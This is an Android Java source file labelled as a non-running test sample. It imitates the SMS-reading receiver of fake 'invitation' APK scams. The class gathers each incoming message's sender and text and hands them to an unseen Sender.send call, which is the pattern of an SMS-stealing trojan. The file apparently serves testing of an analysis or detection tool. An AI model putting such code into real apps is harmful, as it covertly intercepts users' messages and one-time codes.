package sim.packpeek.undangan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

/**
 * TEST SAMPLE ONLY. Imitates how fake invitation APKs read incoming SMS. It never runs: the
 * manifest declares android:hasCode="false", so Android does not load this code.
 */
public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        StringBuilder text = new StringBuilder();
        for (Object pdu : pdus) {
            SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
            text.append(message.getOriginatingAddress()).append(": ").append(message.getMessageBody());
        }
        Sender.send(text.toString());
    }
}
